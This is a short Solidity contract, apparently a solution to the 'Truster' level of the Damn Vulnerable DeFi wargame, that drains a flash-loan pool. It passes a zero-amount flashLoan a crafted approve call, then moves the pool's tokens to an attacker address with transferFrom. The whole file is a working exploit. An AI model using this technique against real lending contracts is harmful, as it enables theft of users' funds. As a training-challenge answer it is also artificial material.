// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import './TrusterLenderPool.sol';
import '@openzeppelin/contracts/token/ERC20/IERC20.sol';

contract TrusterExploit {
    TrusterLenderPool private pool;

    constructor(address poolAddress) {
        pool = TrusterLenderPool(poolAddress);
    }

    function depleteFunds(uint256 tokenAmount, address attacker) external {
        // Approve tokens
        IERC20 token = pool.damnValuableToken();

        pool.flashLoan(
            0,
            address(this),
            address(token),
            abi.encodeWithSignature('approve(address,uint256)', address(this), tokenAmount)
        );

        // Transfer to attacker
        token.transferFrom(address(pool), attacker, tokenAmount);
    }
}
